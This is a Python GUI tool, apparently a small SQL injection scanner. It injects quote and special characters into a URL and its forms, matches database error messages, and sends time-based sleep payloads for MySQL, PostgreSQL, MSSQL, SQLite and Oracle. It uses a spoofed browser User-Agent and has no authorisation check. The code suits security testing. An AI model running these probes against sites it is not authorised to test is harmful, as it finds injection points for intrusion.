import sys
from os import startfile
import time
from typing import Set

# Импорт библитеотеки для работы с запросами
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

from urllib.parse import urljoin

# Импорт библитеки для работы для парсинга и работы с формами сайта
import bs4.element
from bs4 import BeautifulSoup as bs

# Импорт библиотеки для валидации URl
from validator_collection import checkers

# Импорт библиотек для QT (GUI)
from PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,
                            QMetaObject, QObject, QPoint, QRect,
                            QSize, QTime, QUrl, Qt)
from PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,
                           QFont, QFontDatabase, QGradient, QIcon,
                           QImage, QKeySequence, QLinearGradient, QPainter,
                           QPalette, QPixmap, QRadialGradient, QTransform)
from PySide6.QtWidgets import (QApplication, QLabel, QLineEdit, QProgressBar,
                               QPushButton, QSizePolicy, QWidget)

"""
Автоматически сгенерированный файл с данными о форме на основе UI-файла
"""


class Ui_Widget(object):
    def setupUi(self, Widget):
        if not Widget.objectName():
            Widget.setObjectName(u"Widget")
        Widget.setWindowModality(Qt.NonModal)
        Widget.resize(350, 150)
        Widget.setMinimumSize(QSize(350, 150))
        Widget.setMaximumSize(QSize(350, 150))
        Widget.setFocusPolicy(Qt.ClickFocus)
        Widget.setAcceptDrops(False)
        Widget.setAutoFillBackground(True)
        self.progressBar = QProgressBar(Widget)
        self.progressBar.setObjectName(u"progressBar")
        self.progressBar.setGeometry(QRect(0, 120, 350, 30))
        self.progressBar.setInputMethodHints(Qt.ImhNone)
        self.progressBar.setValue(50)
        self.progressBar.setTextVisible(False)
        self.lineEdit_Url = QLineEdit(Widget)
        self.lineEdit_Url.setObjectName(u"lineEdit_Url")
        self.lineEdit_Url.setGeometry(QRect(0, 20, 350, 30))
        self.pushButton_Error = QPushButton(Widget)
        self.pushButton_Error.setObjectName(u"pushButton_Error")
        self.pushButton_Error.setGeometry(QRect(0, 50, 170, 50))
        self.pushButton_Results = QPushButton(Widget)
        self.pushButton_Results.setObjectName(u"pushButton_Results")
        self.pushButton_Results.setGeometry(QRect(180, 50, 170, 50))
        self.label_main = QLabel(Widget)
        self.label_main.setObjectName(u"label_main")
        self.label_main.setGeometry(QRect(115, 0, 120, 20))
        font = QFont()
        font.setBold(True)
        font.setItalic(True)
        font.setStrikeOut(False)
        font.setKerning(False)
        font.setStyleStrategy(QFont.PreferDefault)
        self.label_main.setFont(font)
        self.label_Status = QLabel(Widget)
        self.label_Status.setObjectName(u"label_Status")
        self.label_Status.setGeometry(QRect(0, 100, 350, 16))

        self.retranslateUi(Widget)

        QMetaObject.connectSlotsByName(Widget)

    # setupUi

    def retranslateUi(self, Widget):
        Widget.setWindowTitle(QCoreApplication.translate("Widget", u"SQLI Tester", None))
        self.lineEdit_Url.setPlaceholderText(QCoreApplication.translate("Widget", u"Введите ваш URL ", None))
        self.pushButton_Error.setText(QCoreApplication.translate("Widget", u"Начать\n"
                                                                           "Тестирование", None))
        # if QT_CONFIG(shortcut)
        self.pushButton_Error.setShortcut(QCoreApplication.translate("Widget", u"Return", None))
        # endif // QT_CONFIG(shortcut)
        self.pushButton_Results.setText(QCoreApplication.translate("Widget", u"Вывод\n"
                                                                             "Результатов", None))
        # if QT_CONFIG(shortcut)
        self.pushButton_Results.setShortcut(QCoreApplication.translate("Widget", u"Shift+Return", None))
        # endif // QT_CONFIG(shortcut)
        self.label_main.setText(QCoreApplication.translate("Widget", u" SQLI  Тестирование ", None))
        self.label_Status.setText(QCoreApplication.translate("Widget", u"Статус: Ничего", None))
    # retranslateUi


"""
Блок кода с error-based тестированием
"""

trash_set = ('\\', '"', "'", '?', '/', '.')

errors = {
    "PostgreSQL":
        ["ERROR:  syntax error"],

    "MySQL":
        ["You have an error in your SQL",
         "you have an error in your sql syntax;",
         "warning: mysql",
         "MySQL server version for the right syntax",
         "supplied argument is not a valid MySQL result resource"],

    "SQLite3":
        ["<b>Warning</b>:  SQLite3",
         "unrecognized token:",
         "Unable to prepare statement:"],

    "SQL Server":
        ["unclosed quotation mark after the character string"],

    "Oracle":
        ["quoted string not properly terminated"]
}
# Задаем набор доступных кодировок
encode_set = (
    'utf_8', 'ascii', 'cp1251', 'utf_16', 'utf_32')


def get_all_forms(url: str) -> bs4.element.ResultSet:
    """
    Функция, использующая BeautifulSoup на request c данного URL
    для получения всех имеющихся форм.

    :param  url: Строка, являющаяся URL сайта.
    :return: ResultSet со всеми формами.
    :rtype: bs4.element.ResultSet
    """

    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form: bs4.element.Tag) -> dict:
    """
    Данная функция, всю возможную полезную информацию
    о предоставленной HTML форме.

    :param  form: HTML форма типа Tag, который является элементом ResultSet.
    :return: Словарь с полученными из формы данными.
    :rtype: dict
    """

    details = {}

    # Получаем действие(action) с формы
    try:
        action = form.attrs.get("action").lower()
    except Exception:
        action = None
    except BaseException:
        action = None

    # Получаем метод формы (POST, GET, и т.д.)
    method = form.attrs.get("method", "get").lower()

    # Получаем детали ввода, такие как тип(type) и имя(name)
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    # Объединяем все в один словрь
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response: requests.models.Response) -> bool:
    """
    Простая булевая функция, определяющая, уязвима ли страница
    к SQL инъекции по ее 'ответу'.

    :param  response: Ответ сайта, полученный постредством модуля requests.
    :return: Булевое значение, показывающее уязвимость страницы -> True - уязвима | False - нет
    :rtype: bool
    """

    for encoding in encode_set:
        for sql, error_list in errors.items():
            for error in error_list:
                # Возвращаем True при условии получении ошибки
                try:
                    if error in response.content.decode(encoding).lower():
                        print(f'{encoding = }, {sql = }')
                        return True
                except Exception:
                    continue
                except BaseException:
                    continue

    # При отсутствии ошибки
    return False


def scan_sql_injection(url: str) -> (bool, str) or (str, str):
    """
    Основная функция, осуществляющая вызов проверки SQLI по самому URL и его формам при необходимости.

    :param      url: Строка, являющаяся URL проверяемого сайта.
    :return:    В случае удачного теста на SQLI, возвращает URL сайта, в противном случае возвращает None.
    :rtype:     None or str
    """
    for char in trash_set:

        # Добавляем 'ошибочные' символы к строке URL
        new_url = f"{url}{char}"
        print("[!] Trying", new_url)

        # Делаем HTTP запрос с отловом ошибок
        try:
            res = s.get(new_url)
        except Exception:
            return False, "Ошибка запроса"
        except BaseException:
            return False, "Ошибка запроса"

        if is_vulnerable(res):
            # Если словили ошибку, значит SQLI допустима -> дальнейшие проверки не требуются,
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return url, char
        # Задержка отправки пакетов
        time.sleep(0.2)

    # Если предыдущий пункт не сработал, начинаем тест всех доступных форм
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}")

    for form in forms:
        form_details = get_form_details(form)

        for char in trash_set:

            # Тело данных, которую мы хотим валидировать
            data = {}

            for input_tag in form_details["inputs"]:
                print(input_tag)

                if input_tag["type"] == "hidden" or input_tag["value"]:

                    # Для любой формы "hidden" или со значением, используем данные с "ошибочным" модификатором
                    try:
                        data[input_tag["name"]] = input_tag["value"] + char
                    except Exception:
                        print('...Wait')
                    except BaseException:
                        print('...Wait')

                elif input_tag["type"] != "submit":

                    # Для всех других, кроме submit'a используем просто "мусорные" данные
                    data[input_tag["name"]] = f"test{char}"

            # Добавляем к URL измененное действие(action)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)

            # Проверка итоговой страницы на SQLI
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                print(form_details)
                return url, char

            # Задержка оправки пакетов
            time.sleep(0.2)
    return False, "URL чист"


"""
Блок кода с основным управляющим кодом GUI
"""


class Widget(QWidget):
    def __init__(self, output_file: str = ''):
        super(Widget, self).__init__()
        self.__ui = Ui_Widget()
        self.__ui.setupUi(self)

        # Задание основных атрибутов класса
        self.__url: str
        self.__feedback: bool
        self.__error_object: str
        self.__output_file = output_file

        # Задание связей между сигналами и слотами (реакция в лице метода класса на изменение состояния объекта)
        self.__ui.pushButton_Error.pressed.connect(self.__disable_clickble_objects)

        self.__ui.pushButton_Error.pressed.connect(self.__error_based_check)
        self.__ui.pushButton_Results.pressed.connect(self.__open_file)

        self.__ui.lineEdit_Url.textChanged.connect(self.__reset_forms)

    # Ряд классовых методов для изменения данных внутри объектов
    def __set_lineEdit_Url(self, text: str) -> None:
        self.__ui.lineEdit_Url.setText(text)

    def __set_label_Status(self, text: str) -> None:
        self.__ui.label_Status.setText("Status: " + text)

    def __set_progress_bar(self, value: int) -> None:
        self.__ui.progressBar.setValue(value)

    # Пара классовых методов на выключение/включение кликаемости объектов
    def __disable_clickble_objects(self) -> None:
        self.__ui.lineEdit_Url.setEnabled(False)
        self.__ui.pushButton_Results.setEnabled(False)
        self.__ui.pushButton_Error.setEnabled(False)

    def __enable_clickble_objects(self) -> None:
        self.__ui.lineEdit_Url.setEnabled(True)
        self.__ui.pushButton_Results.setEnabled(True)
        self.__ui.pushButton_Error.setEnabled(True)

    # Выгрузка результатов в файл (Задается програмно в блоке main)
    def __send_data_to_file(self) -> None:
        with open(file=self.__output_file, mode='a+', encoding='utf-8') as file:
            feedback = f"[{'URL Уязвим' if (self.__feedback is not False) else 'URL Чист'}]"
            file.write(f"{feedback:>12} >> {self.__error_object:>26} >> {self.__url}\n")

    def __open_file(self) -> None:
        startfile(self.__output_file[2::])

    # Восстановка формами стандартного значения
    def __reset_forms(self) -> None:
        self.__set_label_Status('')

    def __validate_url(self) -> False or str:
        self.__url = self.__ui.lineEdit_Url.text()
        if not checkers.is_url(self.__url):
            self.__set_label_Status("Неправильный URL")
            self.__enable_clickble_objects()
            return False

        if not self.__check_connection_url():
            self.__set_label_Status("Нет доступа к этому URL")
            self.__enable_clickble_objects()
            return False

        return self.__url

    def __check_connection_url(self) -> bool:
        try:
            requests.get(self.__url)
        except BaseException as be:
            print(be)
            return False
        return True

    # Time-based тестирование
    def __time_based_check(self, sleep):
        delay_set = (
            # MySQL
            "sleep(~)",
            "SLEEP(~)",
            "BENCHMARK(~)",

            # PostgreSQL
            "PG_SLEEP (~)",

            # MSSQL
            "WAITFOR DELAY '00:00:0~'",

            # SQLite3
            "sqlite3_sleep(~)",

            # Oracle
            'dbms_pipe.receive_message("test", ~)'
        )

        where_id = self.__url.rfind('=') + 1
        if where_id != 0:
            base_url = self.__url[0:where_id]
        else:
            base_url = self.__url + '?id='

        for payload in delay_set:
            payload = payload.replace('~', str(sleep))
            url = base_url + payload
            req = requests.get(url)
            run = req.elapsed.total_seconds()
            if run > sleep:
                return True
            else:
                continue
            time.sleep(0.1)
        return False

    # Вызов методов из самописного модуля для error-based тестирования с предварительной валидацией URL
    # С последующим вызовом time-based тестирования при необходимости
    def __error_based_check(self) -> None:
        self.__url = self.__validate_url()
        if self.__url is False:
            return

        self.__set_label_Status("Начата проверка на SQLI")
        self.__set_progress_bar(5)

        url, status = scan_sql_injection(self.__url)
        self.__set_label_Status(status if url is False else f"Инъекция возможна, ошибка получена после < {status} >")
        self.__error_object = '[Ошибка отсутствует]' if url is False else f'[Ошибку вызвал знак < {status} >]'
        self.__set_progress_bar(50)

        if url is False:
            self.__set_label_Status("Запущен альтернативный способ тестирования")
            url = self.__time_based_check(sleep=2)
            print(url)
            self.__set_label_Status('URL Чист' if url is False else f"Инъекция возможна, получена задержка")
            self.__error_object = '[Задержка отсутствует]' if url is False else '[Получена задержка]'

        self.__feedback = url
        self.__set_progress_bar(100)
        self.__send_data_to_file()

        time.sleep(2.5)
        self.__set_progress_bar(0)
        self.__enable_clickble_objects()


# Основная функция -> Запуск окна
def main() -> None:
    app = QApplication(sys.argv)

    window = Widget(output_file="./log.txt")

    window.setWindowTitle("SQLI Tester")

    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    # Инициализируем HTTP сессию
    s = requests.Session()
    retry = Retry(connect=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    s.mount('http://', adapter)

    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
                              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" \
                              "83.0.4103.106 Safari/537.36"
    main()
